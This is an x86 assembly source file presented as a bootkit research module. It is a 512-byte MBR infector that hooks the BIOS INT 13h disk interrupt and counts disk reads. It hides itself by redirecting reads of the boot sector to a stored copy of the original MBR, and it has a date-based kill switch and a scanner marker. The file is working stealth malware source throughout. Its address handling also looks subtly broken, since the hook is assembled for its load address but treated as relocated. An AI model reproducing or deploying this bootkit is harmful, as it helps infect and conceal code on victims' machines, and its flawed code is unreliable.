; mbr_infector.asm - Legacy BIOS MBR Bootkit Research Module
;
; Demonstrates INT 13h hooking from a Master Boot Record.
; 512-byte MBR that hooks the BIOS disk interrupt to intercept
; all disk reads, then chain-loads the original MBR.
;
; Build: nasm -f bin -o mbr_infector.bin mbr_infector.asm
;
; Copyright (c) 2026, Barzakh Research Project
; SPDX-License-Identifier: BSD-2-Clause-Patent

[BITS 16]
[ORG 0x7C00]

; ============================================================
; MBR Entry Point - BIOS loads us at 0000:7C00
; ============================================================
start:
    cli
    xor     ax, ax
    mov     ds, ax
    mov     es, ax
    mov     ss, ax
    mov     sp, 0x7C00          ; Stack below our code
    sti

    ; Relocate ourselves to 0000:0600 to free 0x7C00 for original MBR
    mov     si, 0x7C00
    mov     di, 0x0600
    mov     cx, 256             ; 512 bytes = 256 words
    rep     movsw

    ; Jump to relocated code
    jmp     0x0000:relocated

; ============================================================
; Relocated code continues here at 0000:0600 + offset
; ============================================================
relocated:
    ; --- Kill-switch check ---
    ; Read CMOS year register (0x09) for expiry check
    mov     al, 0x09
    out     0x70, al
    in      al, 0x71            ; BCD year (e.g., 0x27 = 2027)
    cmp     al, 0x28            ; If year >= 2028, skip hooking
    jae     .skip_hook

    ; --- Hook INT 13h ---
    ; Save original INT 13h vector
    mov     ax, [0x004C]        ; INT 13h offset (IVT entry 0x13 * 4 = 0x4C)
    mov     [orig_int13_off], ax
    mov     ax, [0x004E]        ; INT 13h segment
    mov     [orig_int13_seg], ax

    ; Install our hook
    cli
    mov     word [0x004C], hook_int13
    mov     word [0x004E], 0x0000  ; Our segment (relocated to 0:0600)
    sti

    ; Set marker that hook is installed
    mov     byte [hook_installed], 1

.skip_hook:
    ; --- Load original MBR from sector 2 (LBA 1) ---
    mov     ah, 0x02            ; BIOS read sectors
    mov     al, 1               ; 1 sector
    mov     ch, 0               ; Cylinder 0
    mov     cl, 2               ; Sector 2 (1-indexed, original MBR backup)
    mov     dh, 0               ; Head 0
    mov     dl, 0x80            ; First hard disk
    mov     bx, 0x7C00          ; Load to 0000:7C00
    int     0x13
    jc      .disk_error

    ; Chain to original MBR
    jmp     0x0000:0x7C00

.disk_error:
    ; Display error and halt
    mov     si, msg_error
    call    print_string
    jmp     $

; ============================================================
; INT 13h Hook Handler
; ============================================================
hook_int13:
    pushf

    ; Check if this is a read operation (AH=02h)
    cmp     ah, 0x02
    jne     .passthrough

    ; Log the read: increment telemetry counter
    inc     word [read_count]

    ; Check if reading MBR (cylinder 0, head 0, sector 1)
    cmp     ch, 0               ; Cylinder 0?
    jne     .passthrough
    cmp     dh, 0               ; Head 0?
    jne     .passthrough
    cmp     cl, 1               ; Sector 1?
    jne     .passthrough

    ; Stealth: redirect MBR reads to the backup sector
    ; This hides our presence from OS-level MBR readers
    mov     cl, 2               ; Read sector 2 instead (original MBR)

.passthrough:
    popf
    ; Call original INT 13h handler via far call
    jmp     far [cs:orig_int13_off]

; ============================================================
; Utility: Print null-terminated string
; ============================================================
print_string:
    lodsb
    or      al, al
    jz      .done
    mov     ah, 0x0E
    mov     bx, 0x0007
    int     0x10
    jmp     print_string
.done:
    ret

; ============================================================
; Data Section
; ============================================================
orig_int13_off: dw 0
orig_int13_seg: dw 0
hook_installed: db 0
read_count:     dw 0

; Signature for scanner detection
barzakh_sig:      db 'AEGS'      ; Scanner marker

msg_error:      db 'Disk error', 0x0D, 0x0A, 0

; ============================================================
; Padding and Boot Signature
; ============================================================
times 440 - ($ - $$) db 0      ; Pad to disk signature offset

; Disk signature (unique identifier)
disk_sig:       dd 0xAE650001
                dw 0            ; Reserved

; Partition table (empty - 4 entries * 16 bytes = 64 bytes)
times 64 db 0

; Boot signature
dw 0xAA55
